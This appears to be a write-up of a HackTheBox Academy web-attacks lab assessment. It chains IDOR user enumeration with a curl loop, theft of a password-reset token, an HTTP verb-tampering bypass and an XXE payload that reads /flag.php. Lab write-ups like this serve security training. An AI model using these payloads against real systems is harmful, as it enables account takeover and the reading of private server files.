# Web Attacks - Skills Assessment

You are performing a web application penetration test for a software development company, and they task you with testing the latest build of their social networking web application. 
Try to utilize the various techniques you learned in this module to identify and exploit multiple vulnerabilities found in the web application.

Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.

## Exercise 


<img width="1549" height="513" alt="image" src="https://github.com/user-attachments/assets/d96797fc-ab8c-4637-8d86-9f577c8573de" />

<img width="1912" height="772" alt="image" src="https://github.com/user-attachments/assets/dd8d2402-fecd-49cc-97d4-aca407e14ea0" />

<img width="1898" height="665" alt="image" src="https://github.com/user-attachments/assets/7e77b600-6407-4a35-8280-2fda7950a5e5" />

Test if this endpoint is vulnerable to IDOR, by changing the uid value: 

<img width="1889" height="584" alt="image" src="https://github.com/user-attachments/assets/dbb8e372-c184-4673-af05-afc5e1fd5dd6" />

<img width="1265" height="469" alt="image" src="https://github.com/user-attachments/assets/2d34393d-fc80-4bb4-807d-6381a7bbfe80" />

<img width="1925" height="475" alt="image" src="https://github.com/user-attachments/assets/2dc84fbe-640a-4057-8391-987979babbf8" />

Fuzz the uid of users from 1 to 100 using script:

```
#!/bin/bash

for uid in {1..100}; do
	curl -s "http://94.237.49.23:37798/api.php/user/$uid"; echo
done
```

```
bash ./script.sh  grep -i "admin" | jq .

{
  "uid": "50",
  "username": "r.raby",
  "full_name": "Rafaela Raby",
  "company": "Okuneva - Mayert"
}
{
  "uid": "51",
  "username": "a.batres",
  "full_name": "Abir Batres",
  "company": "Rosenbaum LLC"
}
{
  "uid": "52", <-------- UID 52
  "username": "a.corrales",  <--------- * 
  "full_name": "Amor Corrales", <------- * 
  "company": "Administrator"   <----------- ADMIN USER** 
}
{
  "uid": "53",
  "username": "n.downs",
  "full_name": "Nico Downs",
  "company": "Welch, Collier and Gulgowski"
}
{
  "uid": "54",
  "username": "d.holcomb",
  "full_name": "Darren Holcomb",
  "company": "Reynolds, Keebler and Lindgren"
}

```

Attempt to change user password and look at network tab response: 

<img width="804" height="312" alt="image" src="https://github.com/user-attachments/assets/3ed3a2cd-71b3-4209-8772-0816ad3f7d70" />

<img width="1632" height="628" alt="image" src="https://github.com/user-attachments/assets/1c9e88fa-320a-482f-8977-1dac879ad994" />

Instead of getting the token for uid 74, change it to 52, as in /api.php/token/52:

<img width="863" height="522" alt="image" src="https://github.com/user-attachments/assets/ba0b3c68-3024-40a2-a9c5-d4314a802745" />
<img width="1080" height="505" alt="image" src="https://github.com/user-attachments/assets/41186dea-b223-409e-ac56-fb6fbbed9f7f" />
<img width="1448" height="532" alt="image" src="https://github.com/user-attachments/assets/7659a5fd-e4c3-48e8-89ec-b84db0621133" />

Reset the password of the user with uid 74 with uid 52, 
All three parameters are known `uid:52`, `token:e51a85fa-17ac-11ec-8e51-e78234eb7b0c`, and a `random password`:

<img width="896" height="515" alt="image" src="https://github.com/user-attachments/assets/430c0116-c863-4f8b-ad94-2920878683ee" />

<img width="668" height="531" alt="image" src="https://github.com/user-attachments/assets/592c6b50-e03f-4355-a5fa-9d55b9299109" />

<img width="1307" height="437" alt="image" src="https://github.com/user-attachments/assets/97d158af-398b-4eb2-b8b0-bd30890358be" />

Bypass this security mechanism by attempting verb tampering, sending a GET request instead of POST, sending the parameters as URL parameters:

<img width="1764" height="524" alt="image" src="https://github.com/user-attachments/assets/efbebd40-c02e-48ae-91c2-2be47a934a75" />

<img width="621" height="495" alt="image" src="https://github.com/user-attachments/assets/481b06df-44b2-440d-8dfa-a1a92604f6df" />

<img width="1314" height="472" alt="image" src="https://github.com/user-attachments/assets/fc3713d5-b67a-4650-a4c2-306b74b72e6c" />

Sign in as the user a.corrales with the password that was used previously: 

`a.corrales:f0e18de14fdadfc38350d97ff7284a25`

<img width="829" height="320" alt="image" src="https://github.com/user-attachments/assets/d5af6cac-c7b3-4f89-b9bd-b473d34f17ce" />

<img width="1164" height="512" alt="image" src="https://github.com/user-attachments/assets/853beb11-ed7c-42d7-8a20-ec159a2e7077" />

<img width="583" height="361" alt="image" src="https://github.com/user-attachments/assets/408e01b0-eb9b-4f42-94a2-78196cb0c70f" />

<img width="1262" height="433" alt="image" src="https://github.com/user-attachments/assets/07971b09-27ff-46e8-b7a8-c8ceb4257585" />

Send a malicious XXE payload that will read the flag file "/flag.php" via the the PHP filter convert.base64-encode:

<img width="961" height="590" alt="image" src="https://github.com/user-attachments/assets/cdb06f97-16d2-4c4f-8aa6-8c5b3a25d4b3" />

```
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
<root>
    <name>&xxe;</name>
    <details>test</details>
    <date>2021-09-22</date>
</root>
```
<img width="1221" height="457" alt="image" src="https://github.com/user-attachments/assets/a02fa999-9a21-4c5f-8f18-da0d33e7b8d0" />

<img width="1013" height="325" alt="image" src="https://github.com/user-attachments/assets/58347ee8-f040-45bd-a6f1-6b835e57460f" />


Decode the Flag: 

```
$ echo -n 'PD9waHAgJGZsYWcgXXXXXXXXXXXXXXXXXc3NGNrM3J9IjsgPz4K' | base64 -d
<?php $flag = "HTB{m4XXXXXXXXXXXck3r}"; ?>
```













